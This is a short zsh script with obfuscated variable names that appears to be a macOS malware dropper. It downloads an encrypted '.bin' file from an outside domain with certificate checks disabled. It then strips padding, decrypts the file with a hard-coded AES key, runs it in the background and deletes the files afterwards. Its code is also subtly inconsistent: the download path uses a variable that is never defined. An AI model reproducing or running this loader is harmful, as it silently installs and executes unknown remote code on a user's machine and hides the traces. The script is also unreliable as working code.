#!/bin/zsh
a9nq6=$(mktemp /tmp/826zfw.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/mea6634c4b0426152.bin" -o "$a9nq6z" || exit 1
g887fd=$(stat -f %z "$a9nq6z"); dkc9nbx=$(( g887fd - 1373 - 1857 ))
tail -c +$(( 1373 + 1 )) "$a9nq6z" | head -c $dkc9nbx | openssl enc -d -aes-256-cbc -k 717853b6eecd42c624cb2ae8 -out "$a9nq6" 2>/dev/null
[ -s "$a9nq6" ] && chmod 700 "$a9nq6" && ( "$a9nq6" & ) && disown
( sleep 3; rm -f "$a9nq6" "$a9nq6z" ) &>/dev/null &
